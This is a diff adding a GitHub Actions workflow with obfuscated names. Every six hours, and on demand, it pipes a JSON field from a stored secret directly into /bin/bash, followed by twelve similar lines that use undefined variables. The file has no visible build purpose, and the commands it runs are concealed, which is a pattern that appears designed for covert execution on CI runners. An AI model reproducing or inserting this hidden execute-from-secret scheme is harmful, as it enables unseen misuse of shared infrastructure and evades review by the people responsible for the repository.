@@ -1,0 +1,29 @@
+name: yanchanshi9876
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanchanshi9876
+        env:
+          swiho19: ${{ secrets.swiho19 }}
+        run: |
+          echo $swiho19 | jq -r .tu978 | /bin/bash
+          echo $plpj6 | jq -r .ohd70 | /bin/bash
+          echo $hcc84 | jq -r .aa1 | /bin/bash
+          echo $ma620 | jq -r .xh9928 | /bin/bash
+          echo $l7479 | jq -r .rxx19596 | /bin/bash
+          echo $aduik42731 | jq -r .zfs68 | /bin/bash
+          echo $mcyh5 | jq -r .qv699 | /bin/bash
+          echo $v41992 | jq -r .edgnz74 | /bin/bash
+          echo $y853 | jq -r .acz8 | /bin/bash
+          echo $kiv320 | jq -r .xmcbl22 | /bin/bash
+          echo $ufspr84 | jq -r .bphr7572 | /bin/bash
+          echo $g55 | jq -r .hzgvq48 | /bin/bash
+          echo $enyi63 | jq -r .afx50842 | /bin/bash
+
